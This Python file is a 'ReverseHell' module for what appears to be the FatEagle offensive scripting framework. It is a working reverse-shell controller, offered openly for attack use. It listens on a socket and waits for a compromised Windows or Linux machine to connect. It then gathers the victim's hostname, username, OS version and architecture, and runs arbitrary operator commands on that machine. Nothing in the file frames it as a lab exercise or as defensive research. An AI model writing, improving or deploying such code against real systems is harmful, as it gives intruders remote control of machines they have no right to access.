import sys
import fescripts.libs.fescripts
from fescripts.libs.PFable import fable,fable_mode
from colorama import init
init()
from colorama import Fore,Back
import signal
import socket
import os
import subprocess

class ReverseHell:
    def signal_handler(self,sig, frame):
      self._end()
    signal.signal(signal.SIGINT, signal_handler)
    _fs = fescripts.libs.fescripts.FE_SCRIPTS("ReverseHell","a FeScript to reverse shell in windows and linux.","""generate a listener for your os (windows or linux), run that on target os, run fescript here and connect to target. BOOM! you have reverse shell access!""",{'ip': {'Body': '', 'Description': 'target ip address', 'Require': True}, 'port': {'Body': '6666', 'Description': 'target port that listens on it', 'Require': True}, 'buffer_size': {'Body': '200000', 'Description': 'maximum buffer size', 'Require': True}},"0xDeviI")
    
    def __init__(self):
      pass
    
    def help(self):
        print(self._fs._totalDesc)

    def _help(self):
      return self._fs._totalDesc

    def _author(self):
      return self._fs._author
    
    def info(self):
      print(self._fs._miniDesc + "\n    Author: " + self._fs._author)
    
    def _info(self):
      return self._fs._miniDesc

    def allRequirement(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        if (self._fs._Opt[i]['Require'] == True):
          allKeys.append(i)
      return allKeys

    def allSwitches(self):
      keys = self._fs._Opt.keys()
      allKeys = []
      for i in keys:
        allKeys.append(i)
      return allKeys

    def _pre_start(self):
      _all_req = self.allRequirement()
      found = False
      for i in _all_req:
        if (self._fs._Opt[i]["Body"] == ""):
          found = True
          break
      if (found):
        print(Fore.RED + "All requirement switches not filled!" + Fore.RESET)   
      else:
        self._start()

    def showSwitch(self,sw):
      print(self._fs._Opt[sw]["Body"])


    def _start(self):
      print("\nFatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.GREEN + " Started!" + Fore.RESET)
      # --------------------------------------------> Script Started!
      try:
        accCM = ["sysinfo"]
        SERVER_HOST = self._fs._Opt["ip"]["Body"]
        SERVER_PORT = int(self._fs._Opt["port"]["Body"])
        BUFFER_SIZE = int(self._fs._Opt["buffer_size"]["Body"])
        SEPARATOR = "<sep>"
        sysinfo = ""
        s = socket.socket()
        s.bind((SERVER_HOST, SERVER_PORT))
        s.listen(5)
        print(f"Listening as {SERVER_HOST}:{SERVER_PORT}")
        client_socket, client_address = s.accept()
        print(f"{client_address[0]}:{client_address[1]}" + Fore.LIGHTGREEN_EX + " Connected!" + Fore.RESET)
        cwd = client_socket.recv(BUFFER_SIZE).decode()
        while True:
          client_socket.send("hostname".encode())
          output = client_socket.recv(BUFFER_SIZE).decode()
          results, cwd = output.split(SEPARATOR)
          cmName = results.replace("\n","")
          client_socket.send("ver".encode())
          output = client_socket.recv(BUFFER_SIZE).decode()
          results, cwd = output.split(SEPARATOR)
          ver = results.replace("\n","")
          client_socket.send("echo %PROCESSOR_ARCHITECTURE%".encode())
          output = client_socket.recv(BUFFER_SIZE).decode()
          results, cwd = output.split(SEPARATOR)
          arch = results.replace("\n","")
          client_socket.send("echo %username%".encode())
          output = client_socket.recv(BUFFER_SIZE).decode()
          results, cwd = output.split(SEPARATOR)
          username = results.replace("\n","")
          sysinfo = f"Computer: {cmName}\nUsername: {username}\nVersion: {ver}\nArchitecture: {arch}\nAccess Type: Reverse Shell Access"
          del cmName,username,ver,arch
          command = input(Fore.LIGHTRED_EX + f"{cwd}" + Fore.BLUE + " $> " + Fore.RESET)
          if not command.strip():
              continue
          if (command.casefold() == "sysinfo"):
            print(sysinfo)
          if (command.casefold() not in accCM):
            client_socket.send(command.encode())
            if command.casefold() == "exit".casefold():
                break
            output = client_socket.recv(BUFFER_SIZE).decode()
            results, cwd = output.split(SEPARATOR)
            print(results)
      except:
        print(Fore.LIGHTRED_EX + "Error: bad requests or wrong port or buffer size" + Fore.RESET)
      # --------------------------------------------> Script Stopped!
      self._end()

    def _end(self):
      print("FatEagle Script ' " + Fore.YELLOW + self.__class__.__name__ + Fore.RESET + " '" + Fore.RED + " Stopped!\n\n" + Fore.RESET)
    
    def missedSwitch(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        if (self._fs._Opt[i].get("Require") == True and self._fs._Opt[i].get("Body") == ""):
          fable_data.append([i,self._fs._Opt[i].get("Body"),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())

    def switchInfo(self):
      fable_data = []
      keys = self._fs._Opt.keys()
      for i in keys:
        fable_data.append([i,self._fs._Opt[i].get("Body"),str(self._fs._Opt[i].get("Require")),self._fs._Opt[i].get("Description")])
      fabled = fable(["switch name","value","required","descrption"],fable_data,fable_mode.SLICED)
      print(fabled.popData())
    
    def setSwitch(self,prop,value):
      self._fs._Opt[prop]["Body"] = value
